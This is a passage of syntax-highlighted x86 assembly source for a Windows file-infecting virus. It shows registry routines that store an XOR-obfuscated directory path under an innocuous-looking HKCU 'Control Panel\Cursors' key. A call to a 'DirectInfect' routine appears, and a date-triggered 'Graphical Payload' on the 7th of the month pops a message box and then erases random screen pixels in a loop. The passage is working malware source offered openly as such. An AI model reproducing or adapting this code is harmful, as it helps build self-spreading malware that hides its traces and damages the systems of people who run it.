                                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_handle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; close key handle</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; (carefull!)</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">set_new_key</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; otherwise create key/val</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">TESTONLY</span><span class="sc0">                                  </span><span class="sc1">; if we must set a new</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                         </span><span class="sc1">; key then we should make</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DirectInfect</span><span class="sc0">                            </span><span class="sc1">; the direct infection</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                        </span><span class="sc1">; now...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">skip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disposition</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; new? or existing?</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_handle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; new key handle</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">; security attrib</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">                          </span><span class="sc1">; all access</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_OPTION_NONVOLATILE</span><span class="sc0">                  </span><span class="sc1">; don't destroy at reboot</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">; class</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">; reserved</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KEY</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; ptr to new key name</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">                       </span><span class="sc1">; parent key</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_RegCreateKeyExA</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                       </span><span class="sc1">; new value length</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_paths</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; new value pointer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">subsequent_call</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc0">                                  </span><span class="sc1">; make it string</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">; reserved</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_name</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; key name for value</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_handle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; new key handle</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_RegSetValueExA</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_paths</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_registry</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">key_was_found</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">skip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_data</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc0">                                </span><span class="sc1">; decrypt key</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">; is the found key</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; still a valid dir?</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">set_new_key</span><span class="sc0">                               </span><span class="sc1">; if not reset...</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exit_registry</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_handle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; close this handle too</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">                                 </span><span class="sc1">; and return with edi</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                          </span><span class="sc1">; pointing the path</span><span class="sc0">
</span><span class="sc5">SetInitialKey</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SetSubsequentKey</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_data</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; retrieve last checked</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_data</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; dir</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc0">                                </span><span class="sc1">; crypt it</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_data</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; and set it in the</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">subsequent_call</span><span class="sc0">                          </span><span class="sc1">; registry</span><span class="sc0">
</span><span class="sc5">SetSubsequentKey</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CryptKey</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">  </span><span class="sc1">; eax = address                 ; this crypts or decrypts</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; the key with a simple</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; XOR algorithm. However</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; using RegEdit you cannot</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; see the encrypted key.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; Instead a bunch of</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                      </span><span class="sc1">; black squares will</span><span class="sc0">
</span><span class="sc5">crypt_key</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">; appear as our key's</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'H'</span><span class="sc0">                      </span><span class="sc1">; value.</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt_key</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CryptKey</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">                </span><span class="sc1">; Where to create key</span><span class="sc0">
</span><span class="sc5">REG_SZ</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; Create String values</span><span class="sc0">
</span><span class="sc5">REG_OPTION_NONVOLATILE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; Do not destroy at reboot</span><span class="sc0">
</span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0F003FH</span><span class="sc0">                  </span><span class="sc1">; all access</span><span class="sc0">
</span><span class="sc5">disposition</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc5">key_handle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">; values ret. by Create</span><span class="sc0">
</span><span class="sc5">KEY</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Control Panel\Cursors"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; new key</span><span class="sc0">
</span><span class="sc5">key_data</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                           </span><span class="sc1">; new value</span><span class="sc0">
</span><span class="sc5">key_len</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">key_name</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"dertaH"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; key name</span><span class="sc0">
</span><span class="sc5">key_type</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Graphical Payload                                                      Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">systime</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get the system time</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetSystemTime</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFF0000h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                           </span><span class="sc1">; Eax = Day of Month...</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                             </span><span class="sc1">; is it 7 ?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                             </span><span class="sc1">; display a window</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wintitle</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wintext</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MessageBoxA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; get screen device context</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetDC</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">screen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">loop_</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">                          </span><span class="sc1">; get a random X-axis place</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">                          </span><span class="sc1">; get a random Y-axis place</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">y</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                 </span><span class="sc1">; erase area flag</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">y</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">screen</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                 </span><span class="sc1">; area size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                 </span><span class="sc1">; area size</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">y</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">y</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">screen</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BitBlt</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; do it...</span><span class="sc0">
                                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01bh</span><span class="sc0">                              </span><span class="sc1">; check if ESC was pressed...</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetAsyncKeyState</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">finish</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loop_</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                              </span><span class="sc1">;</span><span class="sc0">
